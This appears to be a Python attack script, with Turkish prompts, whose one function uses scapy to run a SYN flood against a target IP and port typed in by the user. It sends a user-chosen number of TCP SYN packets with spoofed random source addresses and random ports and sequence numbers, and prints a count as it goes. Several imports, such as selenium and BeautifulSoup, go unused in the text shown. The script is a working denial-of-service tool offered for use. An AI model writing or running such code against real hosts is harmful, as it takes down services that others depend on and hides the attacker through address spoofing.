from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor, wait
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from string import ascii_lowercase
from selenium import webdriver
from bs4 import BeautifulSoup
from os import system, sys
from scapy.all import *
from colorama import *
import threading
import requests
import random
import time
import os

def perform_syn_flood():
    def randomIP():
        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        return ip

    def randInt():
        return random.randint(1000, 9000)

    def SYN_Flood(dstIP, dstPort, counter):
        total = 0
        for i in range(counter):
            IP_Packet = IP()
            IP_Packet.src = randomIP()
            IP_Packet.dst = dstIP

            TCP_Packet = TCP()
            TCP_Packet.sport = randInt()
            TCP_Packet.dport = dstPort
            TCP_Packet.flags = "S"
            TCP_Packet.seq = randInt()
            TCP_Packet.window = randInt()

            send(IP_Packet / TCP_Packet, verbose=0)
            total += 1
            print(Fore.GREEN + f"{total}. Paket Gönderildi...")

        print(Fore.GREEN + f"\nToplam gönderilen paket sayısı: {total}\n")

    os.system("clear" if os.name == "posix" else "cls")

    dstIP = input("\nHedef IP: ")
    portmain = int(input("Hedef Port: "))
    countermain = int(input("Kaç Tane Paket Gönderilsin: "))

    SYN_Flood(dstIP, portmain, countermain)